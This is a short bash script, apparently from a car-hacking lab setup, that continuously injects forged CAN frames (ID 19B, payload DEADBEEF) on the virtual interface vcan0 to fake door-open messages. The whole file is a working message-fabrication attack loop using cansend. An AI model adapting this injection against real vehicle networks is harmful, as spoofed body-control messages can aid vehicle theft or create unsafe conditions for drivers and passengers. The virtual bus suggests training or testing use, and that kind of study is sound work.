#!/bin/bash
# Fabrication Attack Script
# Inject fake door open messages on vcan0

echo "Starting Fabrication Attack on vcan0 (ID: 19B)..."

# Continuous injection of fake CAN messages
while true; do
    cansend vcan0 19B#DEADBEEF  # Fake data: DEADBEEF
    sleep 0.1                   # Adjust frequency as needed
done
